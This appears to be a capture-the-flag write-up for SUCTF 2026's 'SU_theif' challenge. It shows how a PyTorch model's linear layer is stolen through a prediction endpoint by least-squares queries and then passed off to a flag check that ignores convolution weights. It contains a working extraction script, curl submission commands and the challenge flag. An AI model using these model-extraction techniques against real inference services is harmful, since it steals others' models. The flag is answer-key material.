---
title: "SUCTF 2026: SU_theif"
description: "Writeup for SU_theif from SUCTF 2026."
slug: suctf-su-theif
date: 2026-03-14 04:36:16.392+0000
competition: "SUCTF 2026"
categories:
    - Model Exploitation
tags:
    - writeup
    - suctf-2026
    - su-theif
---

## Challenge

- Competition: [SUCTF 2026](https://ctftime.org/event/3161/)
- Challenge: `SU_theif`
- Category: `Model Exploitation`
- Original target(s): [http://1.95.113.59:10003](http://1.95.113.59:10003)


## Solve Path

FLAG:
SUCTF{n0t_4ll_h1st0ry_t3lls_th3_truth_6a4e2b8d}

WRITEUP:
1) Target Overview
URL / endpoint: `http://1.95.113.59:10003`
Tech stack (if known): Flask, PyTorch, Werkzeug/3.1.6, Python/3.9.23
Observed behavior: `/predict` accepts a JSON `image` tensor and returns a 256-dim prediction; `/flag` accepts a base64-encoded PyTorch state dict and compares it against the server model.

2) Recon
Directory discovery: source code in the attachment shows only `/`, `/predict`, `/flag`
Parameters found: `/predict` uses JSON key `image`; `/flag` uses JSON key `model`
Cookies / sessions: none
Headers: `Server: Werkzeug/3.1.6 Python/3.9.23`
JS analysis: none
Hidden endpoints: none in source
Source review: `/flag` only checks parameters with `dim()==2` or `dim()==1`, so `conv.weight` and `conv1.weight` are never verified; valid `predict` input is `1x1x32x32` (or `33x33`, same effective output shape)

3) Vulnerability
Type: model extraction plus flawed parameter validation
Root cause: `/predict` exposes an unrestricted inference oracle, while `/flag` ignores the 4D convolution weights and only enforces the linear layer and biases
Proof of vulnerability: submitting the provided base model fails at `Layer weight difference too large at layer 0`; after extracting the last layer from `/predict` and keeping the base convolution kernels, the reconstructed model passes and returns the flag

4) Exploitation
Step-by-step HTTP requests

Probe:
```bash
curl.exe -i "http://1.95.113.59:10003/"
```

Oracle extraction and reconstruction:
```python
import requests, torch, torch.nn as nn

class Net(nn.Module):
    def __init__(self):
        super().__init__()
        self.linear = nn.Linear(256, 256)
        self.conv = nn.Conv2d(1, 1, (3, 3), stride=1)
        self.conv1 = nn.Conv2d(1, 1, (2, 2), stride=2)
    def features(self, x):
        x = nn.functional.pad(x, (2, 0, 2, 0), mode='constant', value=0)
        x = self.conv(x)
        x = self.conv1(x)
        return x.view(x.shape[0], -1)

url = "http://1.95.113.59:10003/predict"
base = Net()
base.load_state_dict(torch.load("model_base.pth", map_location="cpu"))
base.eval()

g = torch.Generator().manual_seed(20260314)
X, Y = [], []
for _ in range(288):
    x = torch.randn((1,1,32,32), generator=g, dtype=torch.float32)
    y = requests.post(url, json={"image": x.tolist()}, timeout=45).json()["prediction"]
    X.append(x.squeeze(0))
    Y.append(torch.tensor(y, dtype=torch.float32))

X = torch.stack(X)
Y = torch.stack(Y)
Z = base.features(X)

A = torch.cat([Z, torch.ones((Z.shape[0],1))], dim=1)
sol = torch.linalg.lstsq(A, Y).solution

state = torch.load("model_base.pth", map_location="cpu")
W = sol[:256, :].T.round()           # exact recovered linear weights
b = (Y - Z @ W.T).mean(dim=0)        # recomputed effective bias

state["linear.weight"] = W
state["linear.bias"] = b
torch.save(state, "stolen.pth")
```

Encode and submit:
```powershell
@'
import base64, json
from pathlib import Path
p = Path("stolen.pth")
Path("stolen.json").write_text(json.dumps({
    "model": base64.b64encode(p.read_bytes()).decode()
}))
'@ | python -

curl.exe -s -X POST "http://1.95.113.59:10003/flag" ^
  -H "Content-Type: application/json" ^
  --data-binary "@stolen.json"
```

Payloads used: random `32x32` float tensors for chosen-query extraction; base64-encoded reconstructed `.pth` file for `/flag`
Why it works: the server model’s linear layer is recoverable from the prediction oracle using the provided base convolution stack, and the unchecked convolution weights can remain unchanged

5) Flag Extraction
Exact request that returns the flag:
```bash
curl.exe -s -X POST "http://1.95.113.59:10003/flag" -H "Content-Type: application/json" --data-binary "@stolen.json"
```

Response proof:
```json
{"flag":"Here is your flag: ...SUCTF{n0t_4ll_h1st0ry_t3lls_th3_truth_6a4e2b8d}"}
```
